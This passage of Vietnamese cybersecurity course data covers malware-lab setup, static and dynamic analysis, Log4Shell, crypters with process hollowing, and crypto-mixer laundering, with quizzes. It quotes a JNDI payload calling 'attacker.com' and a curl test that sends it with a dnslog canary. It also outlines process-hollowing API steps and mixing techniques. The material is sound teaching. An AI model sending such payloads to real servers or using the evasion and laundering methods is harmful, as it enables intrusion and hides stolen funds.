                    "Phân tích mã độc (Malware Analysis) là công việc nguy hiểm tương tự như làm việc với các mẫu virus sinh học nguy hiểm trong phòng thí nghiệm cấp độ 4 (BSL-4). Một sơ suất nhỏ trong việc cấu hình card mạng có thể khiến ransomware lây lan ra toàn bộ mạng LAN của cơ quan hoặc tự động kết nối ra máy chủ chỉ huy C2 của tin tặc. Do đó, nguyên tắc số 1 là: **Tuyệt đối không bao giờ để máy ảo phân tích mã độc kết nối trực tiếp ra mạng Internet thật qua chế độ Bridged hoặc NAT!**"
                ),
                (
                    "Kiến Trúc Mạng Host-Only & Giả Lập Dịch Vụ Mạng (INetSim)",
                    "Mô hình chuẩn của một phòng lab phân tích mã độc bao gồm hai máy ảo nằm trên cùng một mạng nội bộ ảo Host-Only: 1. Máy nạn nhân (Victim VM - thường là Windows 10/11) đã cài đặt các công cụ phân tích (x64dbg, Process Hacker, Wireshark). 2. Máy chủ dịch vụ giả lập (Remnux Linux) chạy công cụ **INetSim** và **FakeNet-NG**. Khi mã độc trên máy Windows gửi yêu cầu truy vấn DNS, HTTP, HTTPS hay IRC, máy ảo Remnux sẽ đóng vai trò máy chủ giả lập, luôn phản hồi 'thành công' và ghi lại toàn bộ gói tin yêu cầu mà không để bất kỳ byte dữ liệu nào thoát ra ngoài Internet."
                ),
                (
                    "Các Kỹ Thuật Né Tránh Máy Ảo (Anti-VM / Anti-Analysis)",
                    "Mã độc hiện đại được trang bị hàng chục cơ chế kiểm tra môi trường: Kiểm tra tên driver ảo hóa (VBoxGuestAdditions, VMware Tools); Kiểm tra số nhân CPU (nếu < 2 cores thì dừng chạy); Kiểm tra dung lượng RAM (nếu < 4GB thì dừng); Kiểm tra chuyển động của con trỏ chuột (nếu chuột không di chuyển thì không kích hoạt mã độc); Kiểm tra thời gian trễ bằng lệnh RDTSC để phát hiện debugger."
                )
            ],
            "Kịch bản tai nạn phòng lab: Mã Độc Quét Mạng Cục Bộ (Worm Propagation): Một chuyên viên phân tích vô tình để card mạng máy ảo ở chế độ Bridged. Khi kích hoạt mẫu worm WannaCry, mã độc lập tức quét cổng SMB 445 của toàn bộ dải mạng công ty và lây nhiễm sang hàng trăm máy chủ kế bên.",
            "Thực hành kiểm tra trạng thái dịch vụ mạng giả lập INetSim trên hệ thống Linux Remnux:",
            ("bash", """# Khởi động dịch vụ mô phỏng toàn diện Internet INetSim
sudo inetsim --data-dir /tmp/inetsim_data

# Kiểm tra xem cổng DNS 53 và HTTP 80 giả lập đã mở hay chưa
ss -tuln | grep -E "53|80"
echo "Môi trường giả lập đã sẵn sàng tiếp nhận và ghi nhật ký lưu lượng mã độc!" """),
            ["Luôn chụp ảnh nhanh trạng thái sạch (Clean Snapshot) của máy ảo trước khi đưa bất kỳ mẫu mã độc nào vào.", "Luôn tắt tính năng Shared Folders và Drag & Drop giữa máy thật và máy ảo."],
            ["Phân tích mã độc bắt buộc phải thực hiện trong môi trường mạng cô lập Host-Only.", "INetSim và FakeNet-NG giúp thu thập lưu lượng mạng mã độc an toàn.", "Mã độc hiện đại liên tục thăm dò môi trường để né tránh máy ảo và sandbox."],
            [
                {"question": "Chế độ card mạng nào của máy ảo VirtualBox đảm bảo cách ly hoàn toàn máy ảo khỏi mạng Internet bên ngoài?", "type": "MULTIPLE_CHOICE", "options": ["Bridged Adapter", "Host-Only Adapter", "NAT", "Generic Driver"], "correct_index": 1, "explanation": "Host-Only Adapter cô lập máy ảo trong mạng riêng với máy chủ."},
                {"question": "Công cụ nào trên Linux thường được sử dụng để giả lập các dịch vụ Internet (DNS, HTTP) cho mã độc tương tác an toàn?", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["INetSim", "inetsim", "FakeNet", "FakeNet-NG"]}], "explanation": "INetSim / FakeNet-NG."},
                {"question": "Mã độc hiện đại có thể kiểm tra số nhân CPU hoặc sự di chuyển của chuột để phát hiện xem nó có đang bị chạy trong sandbox hay không?", "type": "TRUE_FALSE", "correct_value": True, "explanation": "Đúng. Đó là các kỹ thuật Anti-Sandbox phổ biến."}
            ]
        ),
        (
            7,
            "Bài 3.7: Phân Tích Tĩnh Mã Độc (Static Malware Analysis): Decompilation, PE Headers & Strings",
            "Làm chủ quy trình phân tích tĩnh mã độc không cần kích hoạt: Trích xuất chuỗi ký tự, giải phẫu cấu trúc PE Header, phân tích bảng hàm nhập khẩu IAT và Disassembly.",
            "https://www.youtube.com/watch?v=1-FyyhpW-t8",
            [
                "Nắm vững các kỹ thuật phân tích tĩnh cơ bản và nâng cao đối với tệp tin thực thi Windows PE.",
                "Sử dụng các công cụ phân tích tĩnh chuẩn: `strings`, `pecheck`, `PEview`, Ghidra và IDA Pro.",
                "Giải mã các kỹ thuật làm mờ chuỗi (String Obfuscation) và phát hiện các cơ chế Packing."
            ],
            [
                (
                    "Mục Tiêu & Lợi Thế Của Phân Tích Tĩnh",
                    "Phân tích tĩnh (Static Analysis) là quá trình mổ xẻ và nghiên cứu mã độc mà KHÔNG CẦN kích hoạt cho mã độc thực thi. Ưu điểm lớn nhất của phương pháp này là an toàn tuyệt đối: Mã độc không chạy nên không có nguy cơ lây nhiễm hệ thống hay kích hoạt các hàm phá hủy dữ liệu. Phân tích tĩnh giúp chuyên gia nhanh chóng xác định họ mã độc (Malware Family), phân loại mức độ nguy hiểm và trích xuất các Chỉ số nhận diện xâm phạm (Indicators of Compromise - IoCs) như địa chỉ IP của máy chủ C2, tên miền độc hại, đường dẫn khóa Registry tạo cơ chế Persistence."
                ),
                (
                    "Cấu Trúc Tệp Tin Thực Thi Portable Executable (PE Header)",
                    "Mọi tệp thực thi `.exe` hoặc thư viện `.dll` trên Windows đều tuân theo định dạng Portable Executable (PE). Việc giải phẫu các phần tiêu đề của PE cung cấp các manh mối vô giá: 1. DOS Header & PE Signature: Bắt đầu bằng 2 byte ma thuật `MZ` (0x4D 0x5A). 2. File Header: Chứa thời gian biên dịch (TimeDateStamp) và kiến trúc CPU (x86 hay x64). 3. Optional Header: Chứa địa chỉ điểm bắt đầu thực thi mã lệnh (AddressOfEntryPoint) và địa chỉ nền ImageBase. 4. Section Headers: Danh sách các phân vùng (`.text` chứa mã thực thi, `.data` chứa biến toàn cục, `.rdata` chứa chuỗi hằng số, `.rsrc` chứa icon và tài nguyên). Sự bất thường về tỷ lệ nghịch giữa kích thước ảo (Virtual Size) và kích thước trên đĩa (Raw Size) là dấu hiệu kinh điển của việc tệp tin đã bị đóng gói (Packed)."
                ),
                (
                    "Bảng Nhập Khẩu Hàm (Import Address Table - IAT)",
                    "IAT liệt kê danh sách các hàm API của hệ điều hành Windows mà mã độc gọi đến. Nhìn vào IAT, chuyên gia có thể đoán được 80% hành vi của mẫu: Nếu IAT chứa `WSAStartup`, `connect`, `send` -> Mã độc có chức năng mạng; Nếu chứa `CreateRemoteThread`, `VirtualAllocEx`, `WriteProcessMemory` -> Mã độc thực hiện kỹ thuật tiêm mã (Process Injection); Nếu chứa `CryptEncrypt`, `CryptAcquireContext` -> Khả năng cao là Ransomware."
                )
            ],
            "Kịch bản né tránh phân tích tĩnh: Kỹ Thuật Đóng Gói (Packing & Crypting): Tác giả mã độc sử dụng các công cụ như UPX hoặc Crypter tự viết để nén và mã hóa toàn bộ phân vùng `.text`. Khi phân tích tĩnh, IAT chỉ hiển thị 2 hàm duy nhất là `LoadLibraryA` và `GetProcAddress`. Toàn bộ mã độc thực tế chỉ được giải mã và nạp vào bộ nhớ khi chương trình chạy thực tế.",
            "Thực hành trích xuất chuỗi ký tự và phân tích mã băm tệp tin bằng công cụ CLI Linux:",
            ("bash", """# 1. Tính toán mã băm SHA-256 của mẫu mã độc để tra cứu trên VirusTotal
sha256sum sample_malware.bin

# 2. Trích xuất các chuỗi ký tự ASCII và Unicode có độ dài >= 8
strings -a -n 8 sample_malware.bin | grep -iE "http|powershell|cmd|exe|dll" | head -n 30

# 3. Sử dụng công cụ rabin2 (thuộc radare2) để xem bảng Import Address Table (IAT)
rabin2 -i sample_malware.bin | head -n 25"""),
            ["Luôn kiểm tra xem tệp tin có bị Packed hay không trước khi mất thời gian đọc mã Disassembly.", "Cảnh giác với thông số TimeDateStamp vì tác giả mã độc có thể làm giả thời gian biên dịch (Timestomping)."],
            ["Phân tích tĩnh giải phẫu mã độc mà không cần chạy tệp tin.", "Cấu trúc PE Header và bảng IAT tiết lộ khả năng và hành vi của mã độc.", "Kỹ thuật Packing mã hóa mã nguồn trên đĩa và chỉ giải nén trong bộ nhớ."],
            [
                {"question": "Hai byte ma thuật (Magic Bytes) đầu tiên nhận diện tệp thực thi Windows PE là gì?", "type": "MULTIPLE_CHOICE", "options": ["PK", "MZ", "ELF", "RAR"], "correct_index": 1, "explanation": "Magic bytes 'MZ' (0x4D 0x5A) đại diện cho tệp PE Windows."},
                {"question": "Bảng nào trong cấu trúc PE liệt kê các hàm API hệ điều hành mà chương trình gọi đến?", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["IAT", "Import Address Table", "iat"]}], "explanation": "Import Address Table (IAT)."},
                {"question": "Phân tích tĩnh mã độc có rủi ro làm lây nhiễm hệ thống phòng lab cao hơn phân tích động?", "type": "TRUE_FALSE", "correct_value": False, "explanation": "Sai. Phân tích tĩnh an toàn hơn vì không thực thi mã độc."}
            ]
        ),
        (
            8,
            "Bài 3.8: Phân Tích Động Mã Độc (Dynamic Malware Analysis): Sandboxing, API Monitoring & Network Traffic",
            "Vận hành phân tích động: Kích hoạt mã độc trong môi trường giám sát, theo dõi tiến trình (Procmon), phân tích thay đổi Registry và bắt gói tin mạng bằng Wireshark.",
            "https://www.youtube.com/watch?v=ddwhVIGjp4Q",
            [
                "Nắm vững phương pháp luận phân tích hành vi động của mã độc khi đang chạy thực tế.",
                "Sử dụng thành thạo bộ công cụ Sysinternals: Process Monitor (Procmon), Process Explorer và RegShot.",
                "Thu thập và phân tích lưu lượng mạng C2 độc hại bằng Wireshark."
            ],
            [
                (
                    "Mục Tiêu Của Phân Tích Động (Dynamic Analysis)",
                    "Khi phân tích tĩnh gặp bế tắc do mã độc bị mã hóa nhiều lớp (Obfuscated / Packed), phân tích động là giải pháp tối thượng: Kích hoạt trực tiếp mã độc bên trong một máy ảo được giám sát chặt chẽ và ghi nhận toàn bộ hành vi thực tế của nó trên hệ điều hành. Phân tích động giúp trả lời các câu hỏi: Mã độc tạo ra những tiến trình con nào? Nó ghi những tệp tin gì vào ổ đĩa? Nó sửa đổi các khóa Registry nào để duy trì quyền khởi động cùng Windows (Persistence)? Và nó đang cố gắng kết nối tới những địa chỉ IP/tên miền C2 nào trên mạng?"
                ),
                (
                    "Bộ Công Cụ Giám Sát Cốt Lõi: Sysinternals Suite",
                    "Để theo dõi toàn diện hành vi của hệ điều hành Windows, chuyên gia sử dụng bộ công cụ Sysinternals do Mark Russinovich phát triển: 1. Process Monitor (Procmon): Công cụ mạnh mẽ nhất giám sát theo thời gian thực mọi hoạt động của Hệ thống tệp (File System), Registry, Tiến trình (Process/Thread) và Mạng. Thiết lập bộ lọc (Filter) theo `Process Name` là kỹ năng sống còn để loại bỏ hàng triệu dòng log rác của Windows. 2. Process Explorer: Thay thế Task Manager tiêu chuẩn, hiển thị cây phả hệ tiến trình (Process Tree), các thư viện DLL đã nạp và các Handle tài nguyên đang mở. 3. RegShot: Chụp ảnh nhanh toàn bộ Registry trước và sau khi chạy mã độc, sau đó so sánh để chỉ ra chính xác các khóa Registry bị tạo mới hoặc sửa đổi."
                ),
                (
                    "Bắt & Phân Tích Lưu Lượng Mạng C2 Bằng Wireshark",
                    "Đồng thời với việc giám sát tiến trình, Wireshark được chạy nền trên card mạng Host-Only để bắt trọn từng gói tin: Truy vấn DNS thăm dò tên miền C2 (thường áp dụng thuật toán Domain Generation Algorithm - DGA); Các yêu cầu HTTP GET/POST gửi thông tin hệ thống nạn nhân (Beaconing); Các gói tin TLS hoặc giao thức tùy biến độc hại."
                )
            ],
            "Kịch bản né tránh phân tích động: Kỹ Thuật Ngủ Trì Hoãn (Sleep Delay / Stalling Code): Mã độc gọi hàm `Sleep()` trong 24 giờ hoặc lặp lại một phép tính vô tận trước khi thực hiện hành vi độc hại nhằm vượt qua thời gian chờ mặc định (thường là 3-5 phút) của các hệ thống Sandbox tự động.",
            "Thực hành cấu hình bộ lọc Process Monitor để theo dõi một tiến trình đáng ngờ:",
            ("powershell", """# Lệnh PowerShell kiểm tra các khóa Registry Run tự khởi động phổ biến của Windows
Get-ItemProperty "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Get-ItemProperty "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"

# Kiểm tra các tiến trình lạ đang chiếm dụng tài nguyên CPU cao
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 Id, ProcessName, CPU, WorkingSet"""),
            ["Luôn khởi động các công cụ giám sát (Procmon, Wireshark, Regshot Shot 1) TRƯỚC KHI kích hoạt tệp mã độc.", "Lọc bỏ các tiến trình hệ thống quen thuộc trong Procmon để tập trung vào tiến trình mục tiêu."],
            ["Phân tích động quan sát hành vi thực tế của mã độc khi đang chạy trong máy ảo an toàn.", "Sysinternals Suite (Procmon, Process Explorer) là bộ công cụ tiêu chuẩn giám sát Windows.", "Wireshark thu thập toàn bộ lưu lượng mạng phục vụ trích xuất IoC máy chủ C2."],
            [
                {"question": "Công cụ nào trong bộ Sysinternals cho phép giám sát theo thời gian thực hoạt động File, Registry và Tiến trình của Windows?", "type": "MULTIPLE_CHOICE", "options": ["Process Monitor (Procmon)", "Wireshark", "Nmap", "Putty"], "correct_index": 0, "explanation": "Process Monitor (Procmon)."},
                {"question": "Công cụ nào cho phép chụp ảnh Registry trước và sau khi kích hoạt mã độc để đối soát sự thay đổi?", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["Regshot", "RegShot", "regshot"]}], "explanation": "Regshot."},
                {"question": "Kỹ thuật mã độc ngủ trì hoãn (Sleep Delay) hàng giờ được thiết kế để đánh lừa các hệ thống Sandbox tự động?", "type": "TRUE_FALSE", "correct_value": True, "explanation": "Đúng. Sandbox tự động thường chỉ phân tích trong vài phút và sẽ kết luận nhầm là an toàn."}
            ]
        ),
        (
            9,
            "Bài 3.9: Khảo Sát Mã Khai Thác Proof-of-Concept Cho Lỗ Hổng Log4Shell (CVE-2021-44228)",
            "Mổ xẻ lỗ hổng thế kỷ Log4Shell trong thư viện Apache Log4j2: Cơ chế JNDI Lookup, khai thác nạp Class từ xa và quy trình rà soát phòng thủ.",
            "https://www.youtube.com/watch?v=ddwhVIGjp4Q",
            [
                "Nắm vững nguyên lý kỹ thuật của lỗ hổng Log4Shell (CVE-2021-44228) với điểm CVSS tuyệt đối 10.0.",
                "Giải mã cơ chế JNDI (Java Naming and Directory Interface) và giao thức LDAP/RMI trong việc nạp mã độc từ xa.",
                "Thực hành rà soát mã nguồn và cấu hình làm cứng hệ thống vô hiệu hóa tính năng Message Lookup."
            ],
            [
                (
                    "Bối Cảnh & Tầm Vóc Của Lỗ Hổng Thế Kỷ Log4Shell",
                    "Tháng 12 năm 2021, thế giới an ninh mạng chấn động trước việc công bố lỗ hổng Log4Shell (mã định danh CVE-2021-44228) trong thư viện ghi log Apache Log4j2 phổ biến hàng đầu thế giới Java. Lỗ hổng được đánh giá mức độ nghiêm trọng tối đa CVSS 10.0 (Critical) vì ba lý do: 1. Mức độ phổ biến khủng khiếp: Log4j được nhúng trong hàng triệu ứng dụng doanh nghiệp (từ máy chủ Minecraft, dịch vụ đám mây AWS, Apple iCloud, VMware, cho đến các hệ thống ngân hàng). 2. Rào cản khai thác bằng không: Bất kỳ ai cũng có thể khai thác thành công chỉ bằng một chuỗi văn bản đơn giản mà không cần tài khoản xác thực. 3. Hậu quả tàn khốc: Cho phép thực thi mã tùy ý từ xa (Remote Code Execution - RCE) với quyền hạn của tiến trình web."
                ),
                (
                    "Cơ Chế Kỹ Thuật: JNDI Lookup & Giao Thức LDAP",
                    "Tính năng chết người bắt nguồn từ cơ chế nội suy chuỗi (String Interpolation) và JNDI Lookup trong Log4j. Log4j cho phép các nhà phát triển nhúng các biến động vào thông điệp log theo cú pháp `${prefix:name}`. Khi Log4j gặp tiền tố `${jndi:...}`, nó sử dụng giao diện JNDI để thực hiện một truy vấn mạng ra bên ngoài: Tin tặc gửi một chuỗi đầu vào độc hại qua bất kỳ trường dữ liệu nào được ghi log (ví dụ: HTTP User-Agent, ô tìm kiếm): `${jndi:ldap://attacker.com/Exploit}`. Máy chủ nạn nhân ghi log chuỗi này, Log4j tự động gửi một truy vấn mạng LDAP tới máy chủ `attacker.com`. Máy chủ LDAP của tin tặc phản hồi một đối tượng Java tham chiếu tới tệp `.class` độc hại. Máy chủ nạn nhân tự động tải tệp `.class` đó về, nạp vào bộ nhớ và thực thi ngay lập tức shellcode của tin tặc!"
                ),
                (
                    "Quy Trình Phòng Thủ & Vá Lỗ Hổng Toàn Diện",
                    "Cộng đồng an ninh đã triển khai hàng loạt biện pháp khắc phục: Cập nhật thư viện Apache Log4j lên phiên bản 2.17.1+ (vô hiệu hóa hoàn toàn JNDI theo mặc định); Cấu hình biến môi trường `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`; Chặn lưu lượng mạng đi ra ngoài (Outbound Egress Filtering) trên các cổng LDAP (389, 636) và RMI (1099) của máy chủ ứng dụng."
                )
            ],
            "Kịch bản tấn công chuỗi cung ứng thực tế: Ngay sau khi PoC được công bố, các nhóm tin tặc trên Darknet đã xây dựng các công cụ quét tự động hàng loạt toàn bộ dải IP Internet. Các nhóm Ransomware đã sử dụng Log4Shell làm bàn đạp Initial Access để xâm nhập vào hàng nghìn mạng lưới doanh nghiệp chỉ trong 48 giờ.",
            "Thực hành kiểm tra lỗ hổng Log4Shell bằng script kiểm thử giả lập gửi payload an toàn:",
            ("bash", r"""# Kiểm tra dịch vụ web có bị ảnh hưởng bởi Log4Shell hay không bằng cURL
target_url="http://127.0.0.1:8080/login"
canary_domain="log4j-test.dnslog.cn"

echo "Gửi payload kiểm thử Log4Shell an toàn trong tiêu đề User-Agent..."
curl -s -H "User-Agent: \${jndi:ldap://$canary_domain/test}" "$target_url"
echo "Kiểm tra bản ghi DNS trên dnslog để xác nhận máy chủ có thực hiện truy vấn ra ngoài hay không." """),
            ["Luôn nâng cấp các thư viện phụ thuộc lên phiên bản mới nhất ngay khi phát hiện lỗ hổng nghiêm trọng.", "Cấu hình tường lửa chặn toàn bộ kết nối mạng đi ra ngoài (Outbound) không cần thiết từ máy chủ ứng dụng."],
            ["Log4Shell (CVE-2021-44228) đạt điểm CVSS tuyệt đối 10.0 cho phép RCE cực kỳ dễ dàng.", "Cơ chế JNDI Lookup tự động tải và thực thi Java class từ xa qua giao thức LDAP.", "Khóa chặn Outbound LDAP/RMI và cập nhật Log4j lên 2.17.1+ là biện pháp phòng thủ triệt để."],
            [
                {"question": "Lỗ hổng Log4Shell (CVE-2021-44228) xảy ra trong thư viện ghi log nổi tiếng nào của hệ sinh thái Java?", "type": "MULTIPLE_CHOICE", "options": ["SLF4J", "Logback", "Apache Log4j2", "java.util.logging"], "correct_index": 2, "explanation": "Apache Log4j2."},
                {"question": "Giao diện và giao thức nào trong Java cho phép Log4j tải mã độc từ xa dẫn đến thực thi mã RCE?", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["JNDI", "jndi", "JNDI/LDAP"]}], "explanation": "Java Naming and Directory Interface (JNDI)."},
                {"question": "Khai thác thành công lỗ hổng Log4Shell bắt buộc tin tặc phải sở hữu tài khoản quản trị hợp lệ trên hệ thống?", "type": "TRUE_FALSE", "correct_value": False, "explanation": "Sai. Log4Shell cho phép khai thác từ xa hoàn toàn không cần xác thực (Unauthenticated RCE)."}
            ]
        ),
        (
            10,
            "Bài 3.10: Cơ Chế Tạo Mã Độc Tự Động (Exploit Builders & Crypters)",
            "Phân tích các công cụ tự động hóa của tội phạm mạng: Exploit Builders, FUD Crypters (Fully Undetectable) và kỹ thuật né tránh Antivirus bằng mã hóa động.",
            "https://www.youtube.com/watch?v=11raTwzQVn4",
            [
                "Hiểu rõ khái niệm và quy trình hoạt động của các bộ Exploit Builders và Crypters.",
                "Giải mã thuật ngữ FUD (Fully Undetectable) và cơ chế vượt qua chữ ký Antivirus.",
                "Thực hành phân tích kỹ thuật tiêm tiến trình Process Hollowing thường dùng trong Crypter."
            ],
            [
                (
                    "Exploit Builders: Nhà Máy Sản Xuất Vũ Khí Mạng Tự Động",
                    "Trong thế giới ngầm, việc tạo ra các tệp tin độc hại không còn đòi hỏi kỹ năng lập trình nhị phân cấp thấp của từng cá nhân. Các nhà phát triển mũ đen phát hành các công cụ gọi là **Exploit Builders**. Một Exploit Builder cung cấp giao diện đồ họa (GUI) thân thiện cho phép kẻ tấn công chỉ cần nhấp chuột chọn: Định dạng tệp đích (ví dụ: tài liệu Word `.doc`, tệp nén `.iso`, tệp ảnh `.lnk`), chọn lỗ hổng muốn khai thác (ví dụ: CVE-2017-11882 trong Microsoft Equation Editor, hoặc CVE-2022-30190 Follina), và chọn mã độc payload muốn thực thi. Builder sẽ tự động biên dịch và tạo ra một tệp tin độc hại hoàn chỉnh sẵn sàng cho chiến dịch lừa đảo."
                ),
                (
                    "FUD Crypters: Nghệ Thuật Ẩn Mình Trước Phần Mềm Diệt Virus",
                    "Khi một mã độc vừa được tạo ra, các công ty Antivirus (Defender, Kaspersky, Symantec) sẽ nhanh chóng phân tích và cập nhật chữ ký số (Signatures) vào cơ sở dữ liệu. Để bảo vệ 'tuổi thọ' của mã độc, tin tặc sử dụng **Crypters**. Một Crypter nhận mã độc gốc làm đầu vào, mã hóa toàn bộ nội dung đó bằng thuật toán riêng (RC4, AES, XOR đa tầng), và nhúng vào một bộ tải mã (Stub Loader). Khi tệp thực thi khởi chạy: Phần mềm diệt virus quét tệp tin trên đĩa chỉ thấy dữ liệu rác đã mã hóa và bộ nạp vô hại (đạt chuẩn FUD - Fully Undetectable 0/70 trên VirusTotal). Bộ Stub Loader sau đó cấp phát vùng nhớ trong RAM, tự giải mã payload gốc và thực thi trực tiếp trong bộ nhớ mà không chạm vào ổ cứng."
                ),
                (
                    "Kỹ Thuật Tiêm Mã Process Hollowing",
                    "Phương pháp kinh điển mà các Crypter sử dụng để qua mặt EDR là **Process Hollowing (Làm rỗng tiến trình)**: 1. Stub khởi tạo một tiến trình hợp pháp của Windows (ví dụ: `svchost.exe` hoặc `explorer.exe`) ở trạng thái tạm dừng (Suspended State). 2. Dùng hàm `NtUnmapViewOfSection` để xóa sạch mã nguồn gốc của Windows khỏi tiến trình đó. 3. Cấp phát vùng nhớ mới bằng `VirtualAllocEx` và ghi payload mã độc đã giải mã vào khoảng trống đó bằng `WriteProcessMemory`. 4. Thay đổi con trỏ lệnh của luồng thực thi tới điểm bắt đầu của mã độc và khôi phục tiến trình bằng `ResumeThread`. Trình quản lý tác vụ Task Manager chỉ nhìn thấy một tiến trình `svchost.exe` hoàn toàn hợp pháp của Microsoft đang chạy, nhưng thực chất bên trong là mã độc tống tiền!"
                )
            ],
            "Kịch bản phòng thủ: Phát Hiện Bằng Công Nghệ EDR & AMSI: Các giải pháp bảo mật hiện đại chuyển từ kiểm tra chữ ký tĩnh sang giám sát hành vi động (Behavioral Analysis) và giao diện quét mã chống phần mềm độc hại của Microsoft (AMSI - Antimalware Scan Interface) để quét bộ nhớ RAM ngay khi mã độc được giải mã.",
            "Thực hành kiểm tra chữ ký số và phát hiện tiến trình bị tiêm mã bằng PowerShell:",
            ("powershell", """# Kiểm tra chữ ký số của một tệp tin thực thi để phát hiện phần mềm không rõ nguồn gốc
Get-AuthenticodeSignature "C:\\Windows\\System32\\svchost.exe"

# Kiểm tra các tiến trình đang chạy từ các thư mục tạm bất thường (AppData, Temp)
Get-Process | Where-Object { $_.Path -like "*AppData*" -or $_.Path -like "*Temp*" } | Select-Object Id, ProcessName, Path"""),
            ["Tuyệt đối không bao giờ tải mẫu mã độc của bạn lên VirusTotal công khai nếu đang kiểm thử thâm nhập vì VirusTotal sẽ chia sẻ mẫu cho các hãng Antivirus vá lỗi ngay.", "Triển khai giải pháp EDR có khả năng giám sát bộ nhớ để phát hiện kỹ thuật Process Hollowing."],
            ["Exploit Builders tự động hóa việc đóng gói mã khai thác vào các định dạng tài liệu thông dụng.", "FUD Crypters mã hóa payload trên đĩa để qua mặt 100% chữ ký Antivirus tĩnh.", "Process Hollowing chiếm dụng tiến trình hệ điều hành hợp pháp để che giấu hành vi độc hại."],
            [
                {"question": "Thuật ngữ 'FUD' trong thế giới ngầm mã độc là viết tắt của cụm từ nào?", "type": "MULTIPLE_CHOICE", "options": ["Fast Universal Decryption", "Fully Undetectable", "Final User Domain", "File Under Denial"], "correct_index": 1, "explanation": "Fully Undetectable (Hoàn toàn không bị Antivirus phát hiện)."},
                {"question": "Kỹ thuật nào làm rỗng mã thực thi của một tiến trình Windows hợp pháp và thay thế bằng mã độc gọi là gì?", "type": "FILL_BLANK", "blanks": [{"accepted_answers": ["Process Hollowing", "process hollowing"]}], "explanation": "Process Hollowing."},
                {"question": "Các giải pháp EDR hiện đại chỉ dựa vào chữ ký băm file trên ổ cứng để phát hiện mã độc?", "type": "TRUE_FALSE", "correct_value": False, "explanation": "Sai. EDR hiện đại giám sát hành vi bộ nhớ và luồng tiến trình thời gian thực."}
            ]
        ),
        (
            11,
            "Bài 3.11: Kỹ Thuật Rửa Tiền Qua Cryptocurrency: CoinJoin, Tumbler & Chống Truy Vết Blockchain",
            "Mổ xẻ các kỹ thuật che giấu dòng tiền phi pháp trên mạng ngầm: Dịch vụ trộn tiền Bitcoin Tumblers, giao thức CoinJoin phi tập trung và giải pháp Monero Swap.",
            "https://www.youtube.com/watch?v=KxfAW8wPDX4",
            [
                "Nắm vững các phương pháp phân tích chuỗi khối (Blockchain Forensics) của cơ quan hành pháp.",
                "Phân tích cơ chế hoạt động của giao thức trộn tiền phân tán CoinJoin (Wasabi Wallet, Samourai Whirlpool).",
                "Đánh giá tính pháp lý và các vụ án triệt phá dịch vụ rửa tiền tiền mã hóa lớn trong lịch sử."
            ],
            [
                (
                    "Thách Thức Rửa Tiền Trong Nền Kinh Tế Mã Hóa",
                    "Sau khi thu được hàng triệu USD từ các vụ tống tiền bằng ransomware hoặc buôn bán trên Darknet, thách thức lớn nhất của tin tặc là: Làm thế nào để đổi số Bitcoin đó ra tiền mặt (USD, EUR) mà không bị cảnh sát bắt giữ? Như đã học, mọi giao dịch Bitcoin đều lưu vết công khai. Nếu tin tặc chuyển thẳng tiền từ ví nhận tiền chuộc lên sàn giao dịch tập trung (như Binance, Coinbase), các hệ thống giám sát AML/CFT (Chống rửa tiền) sẽ lập tức phong tỏa tài khoản và bàn giao thông tin cho FBI. Do đó, kỹ thuật **Rửa tiền trên Blockchain (Crypto Laundering)** ra đời."
                ),
                (
                    "Các Thế Hệ Công Nghệ Trộn Tiền (Crypto Mixers / Tumblers)",
                    "1. Thế Hệ 1: Dịch vụ trộn tiền tập trung (Centralized Tumblers như Helix, Bitcoin Fog, Blender.io): Người dùng gửi Bitcoin vào một hồ bơi chung (Pool) của dịch vụ, dịch vụ tính phí 1-3% và gửi trả lại các đồng Bitcoin khác từ nguồn khác sau một khoảng thời gian ngẫu nhiên. Nhược điểm: Phụ thuộc vào sự trung thực của chủ dịch vụ (dễ bị Exit Scam) và máy chủ tập trung dễ bị FBI tịch thu nhật ký. 2. Thế Hệ 2: Giao thức trộn tiền phân tán phi tập trung **CoinJoin**: Nhiều người dùng cùng phối hợp để tạo ra một giao dịch Bitcoin duy nhất có hàng trăm đầu vào (Inputs) và hàng trăm đầu ra (Outputs) có giá trị bằng nhau tuyệt đối (ví dụ cùng là 0.1 BTC). Khi một người ngoài nhìn vào giao dịch, không có bất kỳ thuật toán toán học nào có thể xác định được đầu ra nào thuộc về đầu vào nào!"
                ),
                (
                    "Cuộc Đàn Áp Pháp Lý Toàn Cầu Nhắm Vào Dịch Vụ Trộn Tiền",
                    "Bộ Tài chính Hoa Kỳ (OFAC) và các cơ quan hành pháp quốc tế đã ban hành các lệnh trừng phạt hình sự nghiêm khắc nhắm vào các nền tảng trộn tiền (như vụ án xử phạt Tornado Cash, bắt giữ nhà sáng lập Wasabi Wallet và Samourai Wallet). Mọi địa chỉ ví tương tác với các dịch vụ này đều bị gắn cờ 'Tainted' (Dính chàm) và bị từ chối phục vụ trên toàn bộ hệ thống tài chính chính thống."
                )
            ],
            "Kịch bản truy vết pháp y chuỗi khối: Kỹ Thuật Phân Tích Bóc Tách Taint (Taint Analysis): Chuyên viên điều tra sử dụng phần mềm Chainalysis để theo dõi tỷ lệ phần trăm tiền dính chàm lan truyền qua các khối giao dịch. Nếu kẻ tấn công cố tình chia nhỏ số tiền thành hàng nghìn giao dịch nhỏ (Peeling Chains), thuật toán phân tích đồ thị vẫn có thể gom cụm và truy nguyên điểm đến cuối cùng.",
            "Thực hành kiểm tra mức độ liên kết của giao dịch Bitcoin bằng script kiểm tra đầu vào và đầu ra:",
            ("python", """# Phân tích tính ẩn danh của một giao dịch CoinJoin giả lập
inputs = ["Ví_A_10_BTC", "Ví_B_10_BTC", "Ví_C_10_BTC"]
outputs = ["Ví_X_10_BTC", "Ví_Y_10_BTC", "Ví_Z_10_BTC"]

print(f"Tổng số đầu vào: {len(inputs)}, Tổng số đầu ra: {len(outputs)}")
print("[+] Trong giao dịch CoinJoin, giá trị các đầu ra hoàn toàn bằng nhau.")
print("[+] Xác suất đoán đúng mối liên hệ giữa 1 đầu vào và 1 đầu ra là: 1/3 = 33.33%")
print("[+] Nếu giao dịch có 100 người tham gia, xác suất truy vết giảm xuống còn 1%!")"""),
